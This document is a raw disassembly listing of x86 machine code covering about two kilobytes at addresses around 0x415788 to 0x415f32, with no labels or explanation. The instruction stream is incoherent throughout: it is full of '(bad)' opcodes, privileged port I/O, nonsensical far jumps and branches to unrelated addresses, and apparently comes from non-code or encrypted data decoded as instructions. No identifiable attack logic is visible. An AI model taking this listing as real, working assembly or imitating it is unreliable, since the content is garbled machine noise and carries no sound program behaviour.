  415788:	adc    ebp,DWORD PTR [eax+0x6796aef8]
  41578e:	mov    dh,0xbf
  415790:	sub    dl,dl
  415792:	bound  esi,QWORD PTR [ebx-0x79]
  415795:	aaa    
  415796:	stos   BYTE PTR es:[edi],al
  415797:	aad    0x74
  415799:	sub    BYTE PTR [ebp+esi*2+0x9],ah
  41579d:	ja     0x4157dc
  41579f:	push   eax
  4157a0:	push   eax
  4157a1:	mov    DWORD PTR [eax-0x1f],ebx
  4157a4:	inc    esi
  4157a5:	jmp    0xa29b3db2
  4157aa:	pop    ecx
  4157ab:	js     0x415731
  4157ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157ae:	adc    eax,0x5f720c70
  4157b3:	fnsave [ecx-0x12c61bd0]
  4157b9:	push   edi
  4157ba:	out    dx,eax
  4157bb:	dec    esi
  4157bc:	xor    bl,BYTE PTR [edi]
  4157be:	stos   BYTE PTR es:[edi],al
  4157bf:	ins    DWORD PTR es:[edi],dx
  4157c0:	outs   dx,BYTE PTR ds:[esi]
  4157c1:	and    BYTE PTR [ebp-0x51],dl
  4157c4:	into   
  4157c5:	sbb    eax,0x2d0519e
  4157ca:	adc    BYTE PTR [edx-0x1561e037],dl
  4157d0:	dec    ebx
  4157d1:	sub    BYTE PTR [esi],0x4
  4157d4:	addr16 sbb al,0xfe
  4157d7:	add    al,0x15
  4157d9:	in     eax,0xff
  4157db:	adc    eax,0x9923047c
  4157e0:	test   DWORD PTR [edi],0xb399c44
  4157e6:	jl     0x41579f
  4157e8:	add    edi,0xefbcb97d
  4157ee:	lods   al,BYTE PTR ds:[esi]
  4157ef:	out    dx,al
  4157f0:	les    edi,FWORD PTR [ecx-0x52]
  4157f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157f4:	int3   
  4157f5:	jns    0x41585e
  4157f7:	push   cs
  4157f8:	jecxz  0x4157ee
  4157fa:	leave  
  4157fb:	(bad)  
  4157fc:	push   esp
  4157fd:	mov    BYTE PTR [edi],dh
  4157ff:	je     0x415809
  415801:	int3   
  415802:	inc    ebp
  415803:	lock repnz (bad) 
  415806:	pop    edi
  415807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415808:	mov    ds:0x6642783b,al
  41580d:	mov    ah,0x24
  41580f:	inc    eax
  415810:	rcl    bl,0xb8
  415813:	or     DWORD PTR [eax],eax
  415815:	push   esp
  415816:	or     dh,BYTE PTR [ebx+0x6caa380c]
  41581c:	pusha  
  41581d:	leave  
  41581e:	leave  
  41581f:	daa    
  415820:	pop    esp
  415821:	push   ebp
  415822:	add    DWORD PTR [ecx-0x21fb7c5],ecx
  415828:	std    
  415829:	pushf  
  41582a:	push   0x7d
  41582c:	fdivr  QWORD PTR [edi]
  41582e:	xchg   esi,eax
  41582f:	add    bl,0xca
  415832:	call   0x590d:0x95af56f8
  415839:	out    dx,al
  41583a:	mov    BYTE PTR [esi],bh
  41583c:	xor    BYTE PTR [ebx],bh
  41583e:	sub    eax,0x97c11de
  415843:	imul   esp,esi,0xb6e1b807
  415849:	rcr    DWORD PTR [edi+edx*1+0x741593d7],cl
  415850:	loop   0x4158c4
  415852:	jo     0x4158ad
  415854:	sub    DWORD PTR ds:[ecx+ebx*1-0x65],ecx
  415859:	call   0x7160a41c
  41585e:	pop    eax
  41585f:	cmp    BYTE PTR [edx+0x49d7e776],0x26
  415866:	push   0x5
  415868:	cwde   
  415869:	xchg   edx,eax
  41586a:	jbe    0x41583f
  41586c:	mov    dl,0x3f
  41586e:	sub    ah,BYTE PTR ss:[esi-0x1b37fb8a]
  415875:	sbb    eax,0x63869910
  41587a:	mulps  xmm6,xmm2
  41587d:	adc    ebx,DWORD PTR [ecx-0x71ac70e0]
  415883:	ins    DWORD PTR es:[edi],dx
  415884:	xchg   DWORD PTR [esi+0x3865030d],ebp
  41588a:	adc    BYTE PTR [edx+0x78],0x45
  41588e:	pushf  
  41588f:	jl     0x4158ca
  415891:	mov    al,BYTE PTR [ebx+0x61]
  415894:	sub    eax,0x85788c52
  415899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41589a:	cwde   
  41589b:	adc    DWORD PTR [edi+0x11b1bf81],edi
  4158a1:	or     al,0xee
  4158a3:	push   0x586d42da
  4158a8:	dec    edx
  4158a9:	imul   eax,DWORD PTR [ebx+ebp*8],0xffffff95
  4158ad:	pop    edx
  4158ae:	push   edi
  4158af:	add    BYTE PTR [ecx-0xad72695],ah
  4158b5:	(bad)  
  4158b6:	(bad)  
  4158b7:	(bad)  
  4158b9:	dec    ebp
  4158ba:	out    0xe2,eax
  4158bc:	pop    edx
  4158bd:	int    0x58
  4158bf:	clc    
  4158c0:	imul   ebx,DWORD PTR [ebp+0x495d5a9],0x4a
  4158c7:	or     eax,0x2389d0ba
  4158cc:	push   ebp
  4158cd:	xor    BYTE PTR cs:[ebx],dh
  4158d0:	into   
  4158d1:	adc    esp,esi
  4158d3:	les    edi,FWORD PTR [eax-0x6509b6ea]
  4158d9:	xor    DWORD PTR [edx-0x37],0xfffffff4
  4158dd:	jnp    0x415941
  4158df:	xor    eax,0xa8af8bd1
  4158e4:	push   es
  4158e5:	xchg   ebx,eax
  4158e6:	int    0x8d
  4158e8:	loope  0x415875
  4158ea:	mov    eax,0x507b981
  4158ef:	lahf   
  4158f0:	sti    
  4158f1:	popa   
  4158f2:	js     0x41592d
  4158f4:	mov    cl,0x55
  4158f6:	inc    ecx
  4158f7:	in     eax,dx
  4158f8:	push   esp
  4158f9:	adc    dl,BYTE PTR [ecx+ecx*1+0x1eee3d7f]
  415900:	not    BYTE PTR [esi-0x798bd7c7]
  415906:	xor    al,0x2a
  415908:	cwde   
  415909:	leave  
  41590a:	jne    0x415913
  41590c:	adc    BYTE PTR [edx+0x61],0x92
  415910:	(bad)  
  415911:	(bad)  
  415912:	fimul  WORD PTR [ebp-0x5f]
  415915:	fidiv  DWORD PTR [edi]
  415917:	ror    DWORD PTR [ebx],0x55
  41591a:	repnz arpl WORD PTR [eax+0x4f72f173],di
  415921:	scas   al,BYTE PTR es:[edi]
  415922:	scas   eax,DWORD PTR es:[edi]
  415923:	in     al,dx
  415924:	(bad)  
  415926:	mov    eax,0x9e035617
  41592b:	das    
  41592c:	loope  0x41595f
  41592e:	(bad)  
  41592f:	fisub  DWORD PTR [eax-0x355163fa]
  415935:	nop
  415936:	xor    al,0xf4
  415938:	or     esi,DWORD PTR [edx+ebp*2]
  41593b:	mov    cl,0x4c
  41593d:	retf   
  41593e:	sar    esp,cl
  415940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415941:	add    al,0x6f
  415943:	cmp    ebx,esp
  415945:	inc    edi
  415946:	shl    DWORD PTR [edi],0xcd
  415949:	fisttp QWORD PTR [ecx]
  41594b:	jb     0x41599d
  41594d:	rol    ebx,1
  41594f:	jno    0x415904
  415951:	pop    edi
  415952:	retf   0x77cc
  415955:	aad    0xdb
  415957:	jmp    0xbf1b523e
  41595c:	push   0xffffff91
  41595e:	in     eax,0xa
  415960:	fiadd  DWORD PTR [eax]
  415962:	lods   eax,DWORD PTR ds:[esi]
  415963:	loope  0x41597b
  415965:	call   0xaa9b5dbb
  41596a:	jo     0x415923
  41596c:	push   ebx
  41596d:	test   eax,0xe9b34d73
  415972:	sub    DWORD PTR [eax],0xedbc1e3e
  415978:	aaa    
  415979:	in     al,0x80
  41597b:	cli    
  41597c:	sbb    eax,0x538186a3
  415981:	and    al,0x8b
  415983:	(bad)  
  415984:	shl    BYTE PTR [esi],0xa4
  415987:	jmp    0xdd6:0xb7fa27aa
  41598e:	fwait
  41598f:	mov    ds:0x705fa301,eax
  415994:	mov    al,ds:0x109c0451
  415999:	xor    al,dh
  41599b:	inc    esp
  41599c:	xchg   BYTE PTR [ecx-0x14e4888a],bl
  4159a2:	dec    edx
  4159a3:	mov    ds:0xece91868,al
  4159a8:	push   0xf
  4159aa:	or     al,0x36
  4159ac:	xor    al,0x8f
  4159ae:	arpl   WORD PTR [esi+0x1c],di
  4159b1:	jmp    FWORD PTR [ebx-0x33]
  4159b4:	inc    eax
  4159b5:	gs xor cl,ah
  4159b8:	inc    esi
  4159b9:	mov    edx,0xb5dfd8c3
  4159be:	repz call edx
  4159c1:	xor    DWORD PTR [esi-0x60],ecx
  4159c4:	mov    al,0x83
  4159c6:	dec    edi
  4159c7:	jno    0x4159d8
  4159c9:	push   esp
  4159ca:	sub    dh,BYTE PTR [ebx+eiz*2+0x75568842]
  4159d1:	mov    esi,0x25877c12
  4159d6:	enter  0x41c,0xf9
  4159da:	sbb    BYTE PTR [ebx+edi*2],bh
  4159dd:	mov    edx,0x5c164149
  4159e2:	sbb    eax,0x1799aa35
  4159e7:	test   DWORD PTR [ebp+eax*8+0x2d21da88],edx
  4159ee:	scas   eax,DWORD PTR es:[edi]
  4159ef:	xor    al,0xf7
  4159f1:	and    al,0x63
  4159f3:	mov    bp,0x67e9
  4159f7:	shl    esi,1
  4159f9:	xor    esp,DWORD PTR [ebp+0x657ebb08]
  4159ff:	adc    eax,0xc0b6e1e
  415a04:	scas   al,BYTE PTR es:[edi]
  415a05:	imul   edx,DWORD PTR [edx+0x7763def9],0xb28443a2
  415a0f:	arpl   WORD PTR [edi],bx
  415a11:	(bad)
  415a14:	dec    ebx
  415a15:	pushf  
  415a16:	mov    al,ds:0x329e6892
  415a1b:	int    0xc5
  415a1d:	sub    ebx,DWORD PTR [ebx-0x21]
  415a20:	cdq    
  415a21:	xor    dl,BYTE PTR [ecx-0x57a4ad0b]
  415a27:	sbb    DWORD PTR [ebx],0x7c69237c
  415a2d:	fdivrp st(0),st
  415a2f:	or     eax,0xe79c57d5
  415a34:	scas   eax,DWORD PTR es:[edi]
  415a35:	sub    eax,0xa75b7e38
  415a3a:	mov    WORD PTR [edx-0x7b],ds
  415a3d:	in     al,dx
  415a3e:	mov    esi,0xb6da6444
  415a43:	popa   
  415a44:	push   ss
  415a45:	lahf   
  415a46:	sbb    al,al
  415a48:	or     ebp,eax
  415a4a:	icebp  
  415a4b:	jnp    0x415a22
  415a4d:	(bad)  
  415a4e:	into   
  415a4f:	(bad)  
  415a50:	imul   edx,DWORD PTR [ebx+0x46],0xffffffc5
  415a54:	call   0x4d17:0xe4d02837
  415a5b:	dec    esi
  415a5c:	ja     0x415a95
  415a5e:	ret    
  415a5f:	push   esp
  415a60:	xlat   BYTE PTR ds:[ebx]
  415a61:	push   ss
  415a62:	pusha  
  415a63:	jle    0x415a5a
  415a65:	jnp    0x415aa5
  415a67:	xchg   ecx,eax
  415a68:	mov    bh,0x63
  415a6a:	popf   
  415a6b:	sub    DWORD PTR [edx],esp
  415a6d:	jg     0x415aa0
  415a6f:	rol    bh,1
  415a71:	js     0x415a7b
  415a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a74:	sub    ah,BYTE PTR [ebx]
  415a76:	adc    edi,DWORD PTR [eax-0x71d26848]
  415a7c:	and    al,0x53
  415a7e:	mov    eax,0xefa6cd72
  415a83:	stos   BYTE PTR es:[edi],al
  415a84:	inc    esi
  415a85:	(bad)  
  415a86:	lock cmp al,0x6a
  415a89:	dec    edi
  415a8a:	xor    ecx,DWORD PTR [edi-0x190592bd]
  415a90:	stos   BYTE PTR es:[edi],al
  415a91:	dec    esi
  415a92:	rcl    eax,0x4e
  415a95:	mov    bh,0x22
  415a97:	(bad)  
  415a98:	idiv   DWORD PTR [ecx+0x47]
  415a9b:	sbb    eax,0x441128e6
  415aa0:	pop    ebp
  415aa1:	popf   
  415aa2:	scas   eax,DWORD PTR es:[edi]
  415aa3:	call   0x616e3ad5
  415aa8:	mov    ds:0x561afba3,eax
  415aad:	mov    cs,WORD PTR [edi]
  415aaf:	hlt    
  415ab0:	mov    fs,WORD PTR [edi-0xc39e8c]
  415ab6:	aas    
  415ab7:	ror    ebx,1
  415ab9:	xchg   ecx,eax
  415aba:	mov    al,ds:0x8339a401
  415abf:	dec    ecx
  415ac0:	pop    ecx
  415ac1:	push   cs
  415ac2:	or     dl,BYTE PTR [eax+0x57]
  415ac5:	mov    DWORD PTR [ecx-0x5971b194],esp
  415acb:	cld    
  415acc:	xchg   esp,eax
  415acd:	pop    esp
  415ace:	xor    bh,BYTE PTR [edi-0x2568f07]
  415ad4:	mov    ah,0x98
  415ad6:	dec    esp
  415ad7:	iret   
  415ad8:	pusha  
  415ad9:	jns    0x415b30
  415adb:	outs   dx,BYTE PTR ds:[esi]
  415adc:	or     BYTE PTR [eax-0x36],cl
  415adf:	or     eax,0x6e7b6f53
  415ae4:	fimul  DWORD PTR [edi-0xa]
  415ae7:	jmp    0xafc1:0xce12939a
  415aee:	mov    dl,0x6c
  415af0:	mov    edx,0x80c86a29
  415af5:	jnp    0x415af9
  415af7:	push   edx
  415af8:	push   0x7f659e59
  415afd:	push   ebx
  415afe:	adc    ebx,DWORD PTR [ebx+eax*2]
  415b01:	jno    0x415aa7
  415b03:	pushf  
  415b04:	push   edi
  415b05:	or     BYTE PTR [eax-0x1b],0xa9
  415b09:	btc    DWORD PTR [edi+0x27],esi
  415b0d:	jecxz  0x415b44
  415b0f:	xor    BYTE PTR [esi+0x7d8489ee],0x9a
  415b16:	jl     0x415ac0
  415b18:	icebp  
  415b19:	and    DWORD PTR [esi+0x35c83cd6],edx
  415b1f:	xchg   edi,eax
  415b20:	out    dx,al
  415b21:	xchg   ebp,eax
  415b22:	add    eax,0xe4f15aa0
  415b27:	push   0x63
  415b29:	jne    0x415b37
  415b2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b2c:	sbb    BYTE PTR [ecx],dl
  415b2e:	aaa    
  415b2f:	imul   edx,DWORD PTR [ebx+0x412955c9],0x16
  415b36:	push   es
  415b37:	icebp  
  415b38:	ret    0xc731
  415b3b:	sub    al,0x4d
  415b3d:	xor    eax,0x394afaf3
  415b42:	mov    cl,0x6f
  415b44:	mov    edi,0x9e89d0f9
  415b49:	ins    DWORD PTR es:[edi],dx
  415b4a:	pop    es
  415b4b:	dec    edx
  415b4c:	aad    0x31
  415b4e:	and    DWORD PTR [ecx-0x6d],ebp
  415b51:	mov    ebp,0xca31a108
  415b56:	pop    ebx
  415b57:	scas   al,BYTE PTR es:[edi]
  415b58:	cs inc eax
  415b5a:	int    0x9d
  415b5c:	(bad)  
  415b5d:	or     BYTE PTR [ebx+0x3b6b6726],ch
  415b63:	xchg   ebp,eax
  415b64:	(bad)  
  415b65:	call   0xad31460a
  415b6a:	jg     0x415b5e
  415b6c:	stos   BYTE PTR es:[edi],al
  415b6d:	xor    ah,BYTE PTR [ebp-0x15f30590]
  415b73:	leave  
  415b74:	stc    
  415b75:	sti    
  415b76:	popa   
  415b77:	sbb    ch,BYTE PTR [ebx+ecx*8]
  415b7a:	mov    DWORD PTR [edi+0x1a2bc20d],ecx
  415b80:	(bad)  
  415b81:	(bad)  
  415b83:	cdq    
  415b84:	mov    eax,ds:0x4f9c9863
  415b89:	mov    ebp,0xe9ecf13c
  415b8e:	xor    bh,BYTE PTR [edx]
  415b90:	and    BYTE PTR [ecx-0x620736b8],ch
  415b96:	(bad)  
  415b97:	std    
  415b98:	jg     0x415bc1
  415b9a:	out    dx,al
  415b9b:	add    al,al
  415b9d:	sbb    ebx,ebp
  415b9f:	inc    ecx
  415ba0:	shl    DWORD PTR [ebp+0x713e69d2],0x3f
  415ba7:	clc    
  415ba8:	or     al,0x80
  415baa:	mov    ecx,0x85373f46
  415baf:	call   0xab0b:0x84224041
  415bb6:	int3   
  415bb7:	push   eax
  415bb8:	mov    al,ds:0x2d61dcfb
  415bbd:	test   eax,0x4f67d28
  415bc2:	xor    al,0xc9
  415bc4:	sub    eax,0x9a7ff624
  415bc9:	cmp    DWORD PTR [eax+ecx*4+0x2e],ecx
  415bcd:	cmp    DWORD PTR gs:[ebx],ecx
  415bd0:	inc    ecx
  415bd1:	cld    
  415bd2:	and    ecx,DWORD PTR [ecx-0x20bff9be]
  415bd8:	pop    es
  415bd9:	jnp    0x415bdc
  415bdb:	lods   al,BYTE PTR ds:[esi]
  415bdc:	add    dl,BYTE PTR [ecx+0x76]
  415bdf:	aaa    
  415be0:	pop    ebp
  415be1:	sub    eax,0xf959abb8
  415be6:	add    al,0x7d
  415be8:	div    BYTE PTR ds:0xc5b959e1
  415bee:	repnz in eax,dx
  415bf0:	jo     0x415c34
  415bf2:	and    DWORD PTR [esp+ecx*8+0x68],esi
  415bf6:	sub    al,0x81
  415bf8:	cld    
  415bf9:	aas    
  415bfa:	xchg   ebx,eax
  415bfb:	push   esp
  415bfc:	(bad)  
  415bfd:	jle    0x415bd2
  415bff:	hlt    
  415c00:	push   ebx
  415c01:	mov    eax,0x453224d3
  415c06:	(bad)
  415c09:	mov    ebp,0xb0a9aa93
  415c0e:	mov    al,0xf0
  415c10:	fst    st(1)
  415c12:	mov    dl,0x66
  415c14:	push   esi
  415c15:	xchg   ecx,eax
  415c16:	clc    
  415c17:	dec    ebx
  415c18:	and    bl,dh
  415c1a:	(bad)  
  415c1b:	pop    ss
  415c1c:	aaa    
  415c1d:	mov    cl,0x79
  415c1f:	nop
  415c20:	add    DWORD PTR [edi-0x29d51d6f],ecx
  415c26:	push   edx
  415c27:	cmp    BYTE PTR [edx-0x7749c28],bl
  415c2d:	push   edx
  415c2e:	sub    al,0x73
  415c30:	adc    al,0xb7
  415c32:	imul   al
  415c34:	jmp    DWORD PTR [ecx+0x60]
  415c37:	xor    al,0x4
  415c39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c3a:	fdiv   DWORD PTR [edx]
  415c3c:	shr    BYTE PTR [edi-0x5d11083b],cl
  415c42:	xor    eax,DWORD PTR [ebp-0x5a]
  415c45:	out    dx,al
  415c46:	popa   
  415c47:	mov    edx,0x5ad61842
  415c4c:	xchg   edx,eax
  415c4d:	repz cmp DWORD PTR [eax+0x1d],esi
  415c51:	cdq    
  415c52:	push   ecx
  415c53:	pop    esp
  415c54:	std    
  415c55:	shl    ch,0x96
  415c58:	add    ch,ah
  415c5a:	pop    edx
  415c5c:	xor    eax,0x4ff247da
  415c61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c62:	jo     0x415c93
  415c64:	shl    BYTE PTR [ebx+0x3e],1
  415c67:	ror    BYTE PTR [edi],cl
  415c69:	stos   DWORD PTR es:[edi],eax
  415c6a:	cmp    cl,BYTE PTR [esi]
  415c6c:	div    DWORD PTR [eax]
  415c6e:	les    ebp,FWORD PTR [ebx]
  415c70:	shl    DWORD PTR [ebp+0x62],1
  415c73:	sbb    ebx,DWORD PTR [ebx+0x49]
  415c76:	inc    ebp
  415c77:	imul   eax,DWORD PTR [edx+0x78e330f5],0x22
  415c7e:	test   al,0x33
  415c80:	adc    ecx,DWORD PTR [ecx]
  415c82:	je     0x415c5c
  415c84:	shl    BYTE PTR [edx+0x63],cl
  415c87:	retf   0xbda0
  415c8a:	push   ebp
  415c8b:	mov    dl,0xe
  415c8d:	xchg   ebp,eax
  415c8e:	jns    0x415cdd
  415c90:	sahf   
  415c91:	mov    ah,BYTE PTR [ebx]
  415c93:	mov    eax,ds:0x9b4bf7c8
  415c98:	inc    esp
  415c99:	mov    edx,0xd711c078
  415c9e:	inc    esp
  415c9f:	mov    ebx,0x21e1a9a8
  415ca4:	(bad)  
  415ca5:	sbb    BYTE PTR [ebp-0x3c],dh
  415ca8:	adc    bh,BYTE PTR [ecx+0x78d2519f]
  415cae:	in     al,dx
  415caf:	in     eax,dx
  415cb0:	stos   DWORD PTR es:[edi],eax
  415cb1:	inc    esp
  415cb2:	jno    0x415cb8
  415cb4:	out    0xd7,eax
  415cb6:	call   0x7e43:0xc31da0ba
  415cbd:	out    0x2d,eax
  415cbf:	ror    BYTE PTR [ebx+0x16],0xe9
  415cc3:	shl    ah,cl
  415cc5:	xor    edi,DWORD PTR [ebx+0x34412a3b]
  415ccb:	mov    DWORD PTR [ebx+0x430e4b17],edx
  415cd1:	cmp    al,0x36
  415cd3:	xchg   ebx,eax
  415cd4:	in     al,0x48
  415cd6:	xchg   ecx,eax
  415cd7:	mov    dh,ch
  415cd9:	mov    bl,0x2b
  415cdb:	fst    QWORD PTR ds:0xa55eea3e
  415ce1:	out    0x77,eax
  415ce3:	mov    dh,0xeb
  415ce5:	mov    esi,0xe95a749a
  415cea:	scas   eax,DWORD PTR es:[edi]
  415ceb:	inc    esi
  415cec:	(bad)  [eax*2-0x1ac10827]
  415cf3:	enter  0xb390,0x61
  415cf7:	xchg   edx,eax
  415cf8:	xor    ch,BYTE PTR [ebx+eax*1+0x25]
  415cfc:	or     ebp,DWORD PTR [edi]
  415cfe:	xchg   ecx,eax
  415cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d00:	dec    BYTE PTR [edx+esi*2+0x48]
  415d04:	call   0x94ff1eed
  415d09:	outs   dx,DWORD PTR ds:[esi]
  415d0a:	mov    ch,0x52
  415d0c:	jge    0x415d1b
  415d0e:	adc    ecx,DWORD PTR [edi+ecx*1-0x5c7d642f]
  415d15:	(bad)  [ebx]
  415d17:	fdivr  QWORD PTR [ecx-0x4530185e]
  415d1d:	jle    0x415cb6
  415d1f:	dec    ebp
  415d20:	fwait
  415d21:	add    eax,0x6d9a792d
  415d26:	sar    DWORD PTR [ecx+0x68],cl
  415d29:	ins    DWORD PTR es:[edi],dx
  415d2a:	xlat   BYTE PTR ds:[ebx]
  415d2b:	(bad)  
  415d2c:	aam    0xa4
  415d2e:	(bad)  
  415d2f:	and    ch,BYTE PTR [esi]
  415d31:	xlat   BYTE PTR ds:[ebx]
  415d32:	adc    DWORD PTR ds:0x67735334,edx
  415d38:	sub    eax,0x899843fa
  415d3d:	push   edx
  415d3e:	out    0x0,al
  415d40:	adc    DWORD PTR [ebp+0xf],ebx
  415d43:	jle    0x415d3e
  415d45:	xchg   ecx,eax
  415d46:	pop    es
  415d47:	cwde   
  415d48:	fstp   DWORD PTR ds:0xc5c32c1f
  415d4e:	inc    ebp
  415d4f:	mov    BYTE PTR [ebx+0x71],0xc6
  415d53:	mov    ebx,gs
  415d55:	adc    al,0x32
  415d57:	sbb    ch,BYTE PTR [esi-0x78073e9e]
  415d5d:	jl     0x415d80
  415d5f:	lds    esi,FWORD PTR [esi]
  415d61:	xchg   esp,eax
  415d62:	stc    
  415d63:	mov    dh,0xbf
  415d65:	int    0x1e
  415d67:	sbb    DWORD PTR [eax+0x8241337],esi
  415d6d:	jnp    0x415d6b
  415d6f:	lock (bad) 
  415d71:	push   ebp
  415d72:	pop    ecx
  415d73:	(bad)  
  415d74:	ds jle 0x415d19
  415d77:	lock std 
  415d79:	addr16 jne 0x415d20
  415d7c:	pop    es
  415d7d:	xchg   edx,eax
  415d7e:	mov    bl,dl
  415d80:	pop    ss
  415d81:	xchg   ah,bl
  415d83:	jmp    0x4a516333
  415d88:	xchg   DWORD PTR [eax-0x7a],esi
  415d8b:	lahf   
  415d8c:	inc    ebx
  415d8d:	xchg   edi,eax
  415d8e:	out    0xa5,al
  415d90:	or     ecx,edi
  415d92:	lods   al,BYTE PTR ds:[esi]
  415d93:	ds gs ret 
  415d96:	sub    DWORD PTR [esp+ecx*4-0x64dac4f4],ecx
  415d9d:	mov    dh,0xff
  415d9f:	dec    esp
  415da0:	mov    cl,BYTE PTR [esi]
  415da2:	sub    DWORD PTR [edi],esi
  415da4:	inc    edx
  415da5:	mov    dh,0xb2
  415da7:	pushf  
  415da8:	sbb    al,0xc5
  415daa:	or     BYTE PTR [edi+0x45],cl
  415dad:	arpl   WORD PTR [esp+edi*4+0x134fac4e],sp
  415db4:	ins    BYTE PTR es:[edi],dx
  415db5:	rcl    BYTE PTR [ebx-0x7c],0xcc
  415db9:	sub    DWORD PTR [ecx],ecx
  415dbb:	xchg   ebp,eax
  415dbc:	leavew 
  415dbe:	pop    eax
  415dbf:	or     BYTE PTR [edi+eiz*8-0x7d],al
  415dc3:	out    0x1,eax
  415dc5:	jo     0x415e2c
  415dc7:	adc    al,BYTE PTR [ecx+0x36]
  415dca:	jmp    0x571a9eed
  415dcf:	adc    al,BYTE PTR [esi-0x4e]
  415dd2:	or     BYTE PTR [esi+0xb],dh
  415dd5:	push   0x4f6e1e3d
  415dda:	ja     0x415d77
  415ddc:	loope  0x415dc4
  415dde:	es cs jbe 0x415e26
  415de2:	cli    
  415de3:	or     eax,0xe58edca2
  415de8:	retf   
  415de9:	ror    DWORD PTR [ebx+0x2e],1
  415dec:	test   DWORD PTR [edx],ebp
  415dee:	xchg   ebp,eax
  415def:	fdivr  st(2),st
  415df1:	int3   
  415df2:	ss popf 
  415df4:	mov    esi,0xcc17702e
  415df9:	sbb    eax,0xecd93dd2
  415dfe:	lods   al,BYTE PTR ds:[esi]
  415dff:	adc    DWORD PTR [ecx-0x7aa03c35],0x58
  415e06:	imul   edi,esp,0x2d
  415e09:	mov    ch,0x44
  415e0b:	jl     0x415e32
  415e0d:	xchg   esp,eax
  415e0e:	retf   0x84af
  415e11:	stos   DWORD PTR es:[edi],eax
  415e12:	add    ecx,edi
  415e14:	bound  edx,QWORD PTR [ebp-0x50]
  415e17:	jecxz  0x415e5a
  415e19:	mov    eax,DWORD PTR [eax+0x93c9f9a]
  415e1f:	xor    eax,0x67df9274
  415e24:	dec    esi
  415e25:	xchg   ah,bh
  415e27:	aam    0xc8
  415e29:	mov    ds,WORD PTR [esi+0x77c0b61c]
  415e2f:	dec    ebp
  415e30:	pop    eax
  415e31:	idiv   DWORD PTR [edi+0x1bea6f8c]
  415e37:	pop    esi
  415e38:	das    
  415e39:	aaa    
  415e3a:	cmc    
  415e3b:	xor    al,0x3a
  415e3d:	dec    edi
  415e3e:	jmp    0xaa49:0x2d87b4e5
  415e45:	inc    esi
  415e46:	jb     0x415e39
  415e48:	sti    
  415e49:	or     BYTE PTR [ebp-0x256c1239],0x52
  415e50:	dec    edx
  415e51:	xor    al,0x57
  415e53:	mov    dh,0x5e
  415e55:	xor    al,bh
  415e57:	leave  
  415e58:	pop    es
  415e59:	push   ds
  415e5a:	push   0xffffff92
  415e5c:	dec    esi
  415e5d:	lods   eax,DWORD PTR ds:[esi]
  415e5e:	sbb    ecx,esp
  415e60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e61:	adc    eax,0xadfc9637
  415e66:	fs sahf 
  415e68:	in     al,dx
  415e69:	rcl    DWORD PTR [edx+0x79f7bdae],0xa9
  415e70:	dec    esp
  415e71:	jmp    0x415e52
  415e73:	lds    ebp,FWORD PTR ds:0x228eaa6e
  415e79:	adc    eax,0x80fea9e
  415e7e:	xchg   ebx,eax
  415e7f:	mov    ebp,0x26b0de2b
  415e84:	scas   eax,DWORD PTR es:[edi]
  415e85:	cmp    ecx,DWORD PTR [edi+0x5efcb1cc]
  415e8b:	mov    al,ds:0x88930811
  415e90:	adc    dl,BYTE PTR [ecx+0x4819b29d]
  415e96:	loop   0x415eb2
  415e98:	pop    edi
  415e99:	fld    TBYTE PTR [ecx-0x4e17aa8]
  415e9f:	jge    0x415e39
  415ea1:	pop    ebx
  415ea2:	add    ch,BYTE PTR [ebx]
  415ea4:	rcl    BYTE PTR [edi],1
  415ea6:	pop    ds
  415ea7:	and    bl,BYTE PTR [edx]
  415ea9:	adc    edx,esi
  415eab:	mov    DWORD PTR fs:[edx],esp
  415eae:	add    DWORD PTR [esi+edi*4],0xffffff93
  415eb2:	adc    ah,al
  415eb4:	leave  
  415eb5:	sbb    ah,cl
  415eb7:	std    
  415eb8:	mov    al,0x6
  415eba:	cwde   
  415ebb:	push   ss
  415ebc:	(bad)  
  415ebd:	sti    
  415ebe:	std    
  415ebf:	xchg   ebx,eax
  415ec0:	push   ss
  415ec1:	sahf   
  415ec2:	mov    ss,ebx
  415ec4:	ficomp DWORD PTR [ecx+edx*4]
  415ec7:	add    DWORD PTR [ecx],ecx
  415ec9:	xor    DWORD PTR [edi],esp
  415ecb:	aam    0x20
  415ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ece:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  415ed0:	or     BYTE PTR [eax],0xbf
  415ed3:	test   BYTE PTR [edi+0x1d],ah
  415ed6:	adc    al,0xbe
  415ed8:	fs cdq 
  415eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415edb:	jae    0x415f28
  415edd:	aas    
  415ede:	ds jl  0x415ec0
  415ee1:	(bad)  
  415ee2:	call   0x8e4:0xafa5beb9
  415ee9:	mov    bl,0xb7
  415eeb:	mov    edi,0x3694efe8
  415ef0:	add    bh,BYTE PTR [ecx-0x1e78a633]
  415ef6:	pop    edi
  415ef7:	in     al,0xc7
  415ef9:	push   eax
  415efa:	cwde   
  415efb:	lahf   
  415efc:	sub    al,0x26
  415efe:	or     al,0xb7
  415f00:	cmp    BYTE PTR [eax],dh
  415f02:	into   
  415f03:	scas   al,BYTE PTR es:[edi]
  415f04:	dec    esp
  415f05:	and    esp,DWORD PTR [esi+0xf]
  415f08:	add    eax,0xcc83e35b
  415f0d:	mov    ds:0xf095f495,al
  415f12:	push   0x6ae22acb
  415f17:	cmp    al,0xda
  415f19:	sbb    DWORD PTR [eax+eax*2],eax
  415f1c:	popa   
  415f1d:	add    al,0x19
  415f1f:	add    BYTE PTR [ecx],0x57
  415f22:	push   cs
  415f23:	aam    0x5b
  415f25:	pop    edx
  415f26:	or     ebx,DWORD PTR [eax-0x25]
  415f29:	xchg   ecx,eax
  415f2a:	dec    eax
  415f2b:	jne    0x415f68
  415f2d:	int    0x62
  415f2f:	cmc    
  415f30:	pop    esp
  415f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f32:	and    eax,0x7daade2f
